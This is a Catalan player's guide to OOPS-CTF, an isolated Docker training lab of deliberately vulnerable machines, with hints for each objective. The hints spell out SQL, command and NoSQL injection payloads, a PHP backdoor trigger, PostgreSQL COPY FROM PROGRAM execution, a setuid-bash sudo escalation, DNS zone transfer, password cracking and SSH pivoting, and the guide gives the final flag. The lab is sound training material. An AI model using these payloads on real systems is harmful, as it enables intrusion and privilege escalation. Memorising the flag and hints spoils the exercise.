# OOPS-CTF — Guia de jugador

Guia per aixecar l'entorn i resoldre'l. Els **objectius** diuen QUÈ has
d'aconseguir; les **pistes** estan plegades (spoilers) i van de subtils a
explícites. No et donen la flag mastegada, però eviten que t'encallis.

> ⚠️ Laboratori aïllat i propi. Màquines vulnerables a posta. No les exposis a
> internet ni a la teva LAN.

---

## 1. Aixecar l'entorn

### Laboratori principal (bridge) — OOPS_1..5
```bash
cd oops-ctf
bash setup-networks.sh          # crea oops_dmz i oops_internal (un sol cop)
make up                         # build + up de les 5 màquines
make ps                         # veure l'estat
```
Una màquina sola: `cd oops1 && docker compose up -d --build`.

### Consola d'atac (Kali a la DMZ)
```bash
docker run -it --rm --network oops_dmz kalilinux/kali-rolling bash
apt update && apt install -y nmap dnsutils netexec hydra hashcat john gobuster proxychains4
```

### Segment L2 realista (macvlan) — atacs DHCP/DNS/ARP
Per practicar DHCP/DNS de veritat, mira `macvlan/README-macvlan.md`:
```bash
cd macvlan && bash setup-macvlan.sh && bash run-lab.sh && bash spawn-victim.sh
```

### Mapa
```
Kali → oops_dmz 10.10.10.0/24 → [oops4 pont] → oops_internal 10.10.20.0/24
       oops1 .11  oops3 .13                     oops2 .12   oops5 .15
       oops4 .14 ─────────────────────────────  oops4 .14
```
`oops_internal` no té sortida: **oops2 i oops5 només via pivot per oops4.**

---

## 2. Fase 0 — Reconeixement

**Objectiu:** saber què hi ha viu i quins serveis exposa la DMZ.
<details><summary>Pista 1</summary>Comença ample: descobreix hosts a 10.10.10.0/24 i després ports/serveis.</details>
<details><summary>Pista 2</summary><code>nmap -sn 10.10.10.0/24</code> i després <code>nmap -sCV -p- 10.10.10.11 10.10.10.13 10.10.10.14</code>.</details>

---

## 3. OOPS_1 — Web (nginx+PHP+MySQL) · 10.10.10.11

**Objectiu A (foothold):** entra al sistema aprofitant la web.
<details><summary>Pista 1</summary>Hi ha TRES camins d'entrada; en tens prou amb un. Un és al formulari de login, un altre a l'eina de diagnòstic, i el tercer és una peculiaritat de la versió de PHP que anuncia la pàgina.</details>
<details><summary>Pista 2</summary>Login: prova <code>' OR '1'='1' -- -</code>. Tools: <code>127.0.0.1; id</code>. PHP: la capçalera <code>User-Agentt</code> d'aquella versió "dev"…</details>
<details><summary>Pista 3</summary>Backdoor: <code>curl -H "User-Agentt: zerodiumsystem('id')" http://10.10.10.11/</code>.</details>

**Objectiu B (contrasenyes):** algunes contrasenyes segueixen un patró; recupera'n.
<details><summary>Pista 1</summary>Les contrasenyes caducades tenen forma <code>&lt;Estació&gt;&lt;Any&gt;!</code>. Construeix el diccionari i llança hydra.</details>
<details><summary>Pista 2</summary>Mira <code>oops1/scripts/gen_wordlist_hint.md</code>: generes la llista i ataques login o SSH.</details>

**Objectiu C (root):** resol l'enigma de "pattern matching".
<details><summary>Pista 1</summary>Hi ha un <code>.php</code> a <code>/internal/</code> amb un missatge codificat en nombres. Cada nombre és un caràcter.</details>
<details><summary>Pista 2</summary>Són codis ASCII decimals: <code>python3 -c "print(''.join(chr(int(x)) for x in open('f').read().split()))"</code>. El text revela el secret de <code>oopsuser</code> → <code>su</code>.</details>

---

## 4. OOPS_3 — Web (:8080) + MongoDB · 10.10.10.13

**Objectiu A:** troba contingut ocult i dades sensibles.
<details><summary>Pista 1</summary>Fuzzeja directoris del web amb gobuster; hi ha rutes de "backup" i "debug".</details>
<details><summary>Pista 2</summary><code>gobuster dir -u http://10.10.10.13:8080 -w /usr/share/wordlists/dirb/common.txt</code>. També: MongoDB (27017) sol estar sense auth.</details>

**Objectiu B:** entra al panell i desxifra les dades.
<details><summary>Pista 1</summary>El login és vulnerable si l'envies com a JSON amb un operador de Mongo.</details>
<details><summary>Pista 2</summary><code>{"username":"admin","password":{"$ne":null}}</code>. La clau AES per desxifrar <code>secure_docs</code> es filtra a <code>/backup</code>.</details>

**Objectiu C (root):** trenca el hash del root.
<details><summary>Pista 1</summary>A la col·lecció <code>system_secrets</code> hi ha un hash tipus <code>$5$...</code> (sha256crypt).</details>
<details><summary>Pista 2</summary><code>hashcat -m 7400 hash.txt rockyou.txt</code>. Cau amb un diccionari comú.</details>

---

## 5. Pivot — OOPS_4 · 10.10.10.14 (pont) i la xarxa interna

**Objectiu A:** descobreix la xarxa interna oculta.
<details><summary>Pista 1</summary>El DNS d'OOPS_4 filtra massa informació si li demanes tota la zona.</details>
<details><summary>Pista 2</summary><code>dig axfr oops.lab @10.10.10.14</code> → apareix <code>oops5.oops.lab</code> (10.10.20.15) i TXTs amb pistes.</details>

**Objectiu B:** aconsegueix foothold a OOPS_4 i la credencial reutilitzable.
<details><summary>Pista 1</summary>El compte SSH d'OOPS_4 té una contrasenya curta i corrent; hydra la troba.</details>
<details><summary>Pista 2</summary>Un cop dins, mira <code>/opt/net/inventory.txt</code>: hi ha la credencial d'OOPS_5.</details>

**Objectiu C:** munta el pivot cap a la xarxa interna.
<details><summary>Pista 1</summary>OOPS_4 és a les dues xarxes; encamina el teu trànsit a través seu.</details>
<details><summary>Pista 2</summary><code>ssh -D 1080 netadmin@10.10.10.14</code> + proxychains, o <code>ssh -L 5432:10.10.20.12:5432 …</code> per arribar a OOPS_2.</details>

---

## 6. OOPS_2 — PostgreSQL · 10.10.20.12 (via pivot)

**Objectiu A (RCE):** executa ordres al servidor via PostgreSQL.
<details><summary>Pista 1</summary>El rol té privilegis excessius; PostgreSQL pot executar programes del sistema durant un COPY.</details>
<details><summary>Pista 2</summary><code>CREATE TABLE x(o text); COPY x FROM PROGRAM 'id'; SELECT * FROM x;</code> (rol <code>intranet:intranet</code>).</details>

**Objectiu B:** desxifra dades i trenca hashos.
<details><summary>Pista 1</summary>La clau AES és al filesystem (l'obtens amb l'RCE); els hashos porten salt.</details>
<details><summary>Pista 2</summary><code>openssl enc -d -aes-256-cbc -pbkdf2 -a -pass pass:&lt;clau de /opt/secure/aes.key&gt;</code>. La clau SSH de <code>dbuser</code> és a la taula <code>ssh_keys</code>.</details>

**Objectiu C (root):** escala amb sudo.
<details><summary>Pista 1</summary><code>sudo -l</code>: pots executar un script de backup com root, i el script confia en un fitxer que TU pots escriure.</details>
<details><summary>Pista 2</summary>Escriu la teva ordre a <code>~/backup.conf</code> (p. ex. <code>chmod +s /bin/bash</code>) i <code>sudo /opt/backup.sh</code>.</details>

---

## 7. OOPS_5 — Crown Jewel · 10.10.20.15 (moviment lateral)

**Objectiu final:** compromet la joia de la corona reutilitzant credencials.
<details><summary>Pista 1</summary>Ja saps que existeix (AXFR) i ja tens una credencial d'OOPS_4. Arriba-hi a través del pivot.</details>
<details><summary>Pista 2</summary><code>proxychains ssh siteadmin@10.10.20.15</code> amb la contrasenya de l'inventari → <code>sudo -l</code> → root. Recull les flags finals.</details>

---

## 8. Segment L2 (macvlan) — DHCP/DNS/ARP

Objectius i pistes específics a **`macvlan/README-macvlan.md`**: AXFR, observació
del DORA, DHCP starvation, rogue DHCP + presa de DNS, i ARP/DNS spoofing.

---

## 9. Ordre recomanat i flags

1. Recon DMZ → 2. OOPS_1 → 3. OOPS_3 → 4. AXFR + foothold OOPS_4 → 5. Pivot →
6. OOPS_2 → 7. OOPS_5 (final) → 8. (extra) L2 macvlan.

Cada màquina té **flag d'usuari** (`user_flag.txt`) i **flag de root**
(`/root/flag.txt`). Objectiu global: recollir-les totes i acabar amb
`FLAG{oops5_CROWN_JEWEL_full_compromise}`.

> Consell professional: documenta cada pas (comanda, resultat, captura) en un
> Obsidian/CherryTree. En surt sol el teu primer writeup de portfoli.
